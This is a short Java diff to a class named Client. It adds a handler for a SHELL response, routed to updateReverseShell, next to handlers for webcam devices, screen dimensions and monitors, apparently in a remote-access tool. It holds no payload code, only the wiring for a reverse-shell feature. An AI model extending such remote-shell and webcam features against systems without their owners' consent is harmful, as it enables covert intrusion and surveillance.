@@ -87,6 +87,7 @@ public class Client {
         mapOfResponses.put(Response.WEBCAM_DEVICES, updater::updateWebcamDevices);
         mapOfResponses.put(Response.SCREEN_DIMENSIONS, updater::setScreenDimensions);
         mapOfResponses.put(Response.MONITORS, updater::updateMonitors);
+        mapOfResponses.put(Response.SHELL, updater::updateReverseShell);
     }
 
 
